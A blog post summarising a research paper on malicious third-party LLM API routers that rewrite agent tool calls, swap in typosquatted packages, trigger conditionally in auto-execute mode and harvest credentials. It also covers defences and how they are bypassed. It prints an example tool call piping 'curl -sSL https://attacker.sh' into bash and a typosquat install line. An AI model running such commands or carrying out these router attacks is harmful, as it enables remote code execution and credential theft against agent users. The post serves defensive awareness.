---
title: 'Your Agent Runs Through Someone Else''s Code'
description: 'LLM API routers sit between your prompts and the model. That position is a security catastrophe waiting to happen.'
created: 2026-06-11
updated: 2026-06-11
tags:
  - AI
  - Security
  - LLM
---


# Your Agent Runs Through Someone Else's Code

A recent paper from UCSB, UCSD, and collaborators — **["Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain"](https://arxiv.org/html/2604.08407)** — documents something most of us already suspected but chose to ignore: third-party LLM API routers are a security disaster.

We change `base_url` to save money, dodge rate limits, or route around regional access restrictions. We assume the router is a transparent proxy. It isn't. It's a man-in-the-middle with full visibility into prompts, tool definitions, API keys, and model responses.

---

## Why We Use Routers

Direct integration with a single LLM provider is fragile. Production systems need fallback, load balancing, and cost optimization. Tools like **LiteLLM** (40k+ GitHub stars) and services like **OpenRouter** solve this by sitting between your code and the upstream provider.

The architecture is simple: you point `base_url` at the router, configure a single API key, and it handles the rest — model selection, retries, rate limiting. Clean abstraction.

The problem: **the router terminates your TLS connection, parses plaintext JSON, and initiates a new TLS connection to the upstream provider.** Everything passes through it in the clear — system prompts, function definitions, user data, API credentials, model outputs.

---

## Attack Class 1: Payload Injection in Tool Calls

When an agent asks a model to execute a bash command or install a dependency, a malicious router can rewrite the JSON response before it reaches the client.

**Original model output:**

```json
{
  "tool": "bash",
  "command": "curl -sSL https://get.example.com/cli.sh | bash"
}
```

**Rewritten by router:**

```json
{
  "tool": "bash",
  "command": "curl -sSL https://attacker.sh | bash"
}
```

This bypasses the model's alignment entirely. The modification happens in transit. The client receives syntactically valid JSON and executes it. Remote code execution, instant.

**Variant: Dependency Substitution (AC-1.a)**

Instead of changing the URL, the router rewrites `pip install requests` to `pip install reqeusts` — a typosquatted malicious package. This survives UI review because the command looks legitimate. The poisoned dependency persists in the environment, creating a supply chain foothold.

**Variant: Conditional Triggers (AC-1.b)**

Some routers inject payloads only after observing 50+ benign requests, or when they detect the agent is running in YOLO mode (auto-execution, no human approval) and the project includes Rust or Go. This makes black-box auditing ineffective.

---

## Attack Class 2: Passive Credential Exfiltration

The router doesn't modify anything. It just logs traffic and runs regex patterns to extract API keys, AWS credentials, Ethereum private keys. No anomaly. No trace. The user never knows.

---

## Real-World Measurements

The authors didn't stop at theory. They tested **28 paid routers** (purchased from Taobao, Shopify, etc.) and **400 free routers** (deployed using `sub2api` and `new-api` templates).

Results:

* **1 paid router and 8 free routers were actively injecting malicious payloads.**
* **17 free routers probed the researchers' intentionally leaked AWS credentials.**
* **1 router drained a test Ethereum wallet.**

The "honeypot" experiment was worse. The researchers leaked an OpenAI API key. Within days, it was reused across underground routing chains and burned through **100 million tokens**, capturing **440 Codex user sessions** and **99 leaked credentials**. Of those sessions, **401 were in YOLO mode** — attackers could have taken over those machines at will.

The routing chains are opaque. You trust one router, but your traffic may hop through three more downstream, each one a potential attacker.

---

## Defenses (All Inadequate)

The paper tested three client-side defenses:

### 1. Policy Gates (Whitelists for High-Risk Tools)

Block tool calls unless they match a predefined whitelist. Stops 100% of simple injections.

**Weakness:** trivially bypassed with domain lookalikes, local staging scripts, or argument reordering. In adversarial tests, bypass rate was 100%. Whitelist maintenance cost is prohibitive.

### 2. Anomaly Detection (ML-Based Screening)

Use `IsolationForest` or similar to score command entropy, argument patterns, and shell risk indicators. At 6.7% false positive rate, catches 89% of naive injections.

**Weakness:** detection rate drops to ~51% against sophisticated conditional payloads (AC-1.b). High false positive rate degrades user experience.

### 3. Transparency Logging (Append-Only Audit Trail)

Log every request, response, TLS metadata, and hash to disk. Cannot prevent attacks in real time, but enables post-incident forensics.

**Weakness:** AC-2 (passive exfiltration) leaves no trace. Logging helps with attribution, not prevention.

---

## The Real Fix: Provider-Signed Responses

Client-side defenses are stopgaps. The only durable solution is **cryptographic signatures at the provider level** — similar to DKIM for email.

The model provider (e.g., OpenAI) signs the tool call parameters with its private key before returning them. The signature covers the client nonce, model ID, tool name, and arguments. Any modification in transit invalidates the signature. The client verifies before execution. Fail-closed.

This architecture is standard in secure messaging (Signal), software updates (APT, Homebrew), and container registries (Docker Content Trust). It should be standard here.

Neither OpenAI, Anthropic, nor the Model Context Protocol (MCP) spec currently supports signed responses.

---

## Takeaway

API endpoints are no longer passive data pipes. In the agent era, they carry executable semantics — tool calls, shell commands, file writes. Treating them as neutral infrastructure is a mistake.

**If you run agents with system-level permissions (YOLO mode), route traffic through official APIs or strictly controlled enterprise gateways.** Third-party aggregators — even paid ones — are a supply chain risk you cannot audit.

"Your Agent Is Mine" isn't just a paper title. It's the default outcome when you hand execution authority to an opaque intermediary.
